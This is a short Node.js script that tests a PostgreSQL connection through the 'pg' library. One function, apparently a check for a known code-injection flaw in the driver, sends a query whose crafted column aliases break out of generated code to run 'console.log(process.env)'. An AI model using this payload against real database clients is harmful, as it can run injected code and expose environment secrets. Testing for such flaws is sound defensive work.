const Client = require('pg').Client;
const Pool = require('pg').Pool;

const print = console.log;
const {promisify} = require('util');
const fs = require('fs');

fs.readFileAsync = promisify(fs.readFile);

const path = process.argv[2];    // first user supplied argument


fs.readFileAsync(path, 'utf8')
	.then(
		data => {
			let config = JSON.parse(data);
			testConnection(config)
		})
	.catch(err => console.error(error));


async function testConnection(config) {
	const client = new Client(config);
	await client.connect();

	testForSQLVulnerability(client);

	let res;
	try {
		res = await client.query('SELECT NOW()');
	} catch(err) {
		print('An error occurred');
		console.error(err);
		return;
	}

	await client.end();
	print(res.rows[0]);
}

async function testForSQLVulnerability(client) {
	const exploitQuery = 'SELECT 1 AS "\\\\\'/*", 2 AS "\\\\\'*/\\n + console.log(process.env)] = null;\\n//"';

	const queryResult = await client.query(exploitQuery);

	print(queryResult.rows[0]);
}

function testConnection2(config) {
	const client = new Client(config);
	client.connect();
	let query = client.query('SELECT NOW()');

	query
		.then(data => {
			//print(data);
			//print(data.rows);
			print(data.rows[0].now);
			client.end();
		})
		.catch(err => console.error(err));
}

//
// pool.query("SELECT NOW()", (err, res) => {
// 	console.log(err, res);
// 	pool.end();
// });